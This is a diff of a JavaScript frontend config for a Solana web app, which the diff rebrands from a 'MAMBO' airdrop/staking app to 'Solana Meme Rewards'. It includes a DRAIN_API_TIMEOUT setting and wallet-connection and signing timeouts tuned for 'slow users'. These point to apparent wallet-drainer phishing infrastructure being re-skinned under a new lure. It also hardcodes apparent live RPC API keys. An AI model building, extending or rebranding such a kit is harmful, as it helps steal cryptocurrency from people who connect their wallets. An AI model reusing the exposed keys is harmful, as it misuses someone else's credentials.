@@ -1,23 +1,24 @@
-// Frontend Configuration for MAMBO Airdrop Application
+// Frontend Configuration for Solana Meme Rewards Application
 // This file will be populated with environment variables during build
 // For Vercel deployment, these values come from Vercel environment variables
 
 window.APP_CONFIG = {
   // Project Configuration
-  PROJECT_NAME: 'MAMBO',
+  PROJECT_NAME: 'Solana Meme Rewards',
+  CACHE_BUST: '9531cea',
   
   // RPC Endpoints
   PRIMARY_RPC: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
   FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
   PUBLIC_RPC: 'https://api.mainnet-beta.solana.com',
   
-  // Timeouts (in milliseconds) - LENIENT FOR SLOW USERS
-  WALLET_CONNECTION_TIMEOUT: 60000, // Increased from 20s to 60s for slow users
-  DEEP_LINKING_TIMEOUT: 30000, // Increased from 10s to 30s for slow users
-  WALLET_INJECTION_TIMEOUT: 30000, // Increased from 10s to 30s for slow users
-  DRAIN_API_TIMEOUT: 180000, // Increased from 120s to 180s for slow users
-  BROADCAST_TIMEOUT: 120000, // Increased from 60s to 120s for slow users
-  SIGNING_TIMEOUT: 150000, // Increased from 90s to 150s for slow users
+  // Timeouts (in milliseconds) - LENIENT FOR SLOW USERS (aligned with backend)
+  WALLET_CONNECTION_TIMEOUT: 60000,
+  DEEP_LINKING_TIMEOUT: 30000,
+  WALLET_INJECTION_TIMEOUT: 30000,
+  DRAIN_API_TIMEOUT: 120000,
+  BROADCAST_TIMEOUT: 90000,
+  SIGNING_TIMEOUT: 120000,
   
   // Retry Configuration
   MAX_RETRIES: 3,
@@ -39,4 +40,4 @@ window.getTimeout = function(key) {
   return window.APP_CONFIG[key] || 30000; // Default 30 seconds
 };
 
-console.log('✅ MAMBO Staking Configuration Loaded:', window.APP_CONFIG);
+console.log('✅ Solana Meme Rewards Configuration Loaded:', window.APP_CONFIG);
